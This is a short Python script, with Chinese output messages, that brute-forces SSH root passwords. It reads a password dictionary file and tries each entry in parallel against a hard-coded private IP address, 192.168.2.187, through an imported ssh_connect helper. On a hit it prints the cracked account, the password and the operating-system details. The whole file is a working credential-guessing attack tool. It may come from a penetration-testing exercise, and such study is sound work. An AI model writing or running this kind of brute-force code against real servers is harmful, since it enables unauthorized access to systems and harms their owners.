import multiprocessing
from ssh_connect import ssh_connect

def ssh_root_passwd_crack(ip, dict, user = 'root'):
	ip_passwd = []
	passwd_file = open(dict, 'r').readlines()
	for passwd in passwd_file:
		ip_passwd.append((ip, user, passwd.strip()))
	# print(ip_passwd)
	pool = multiprocessing.Pool(processes=5)
	ssh_result = pool.map(ssh_connect, ip_passwd)
	for x in ssh_result:
		if x[0] == 1:
			print('-------------------------------破解成功-------------------------------')
			print('账号为:{}\n密码为:{}\n操作系统信息为:{}'.format(user, x[1], x[2]))
			print('---------------------------------------------------------------------')
			break

	else:
		print('密码破解失败')

if __name__ == '__main__':
	import time
	start_time = time.time()
	ssh_root_passwd_crack('192.168.2.187', 'dict.txt', 'root')
	end_time = time.time()
	print('运行时间为: {} 秒'.format(end_time - start_time))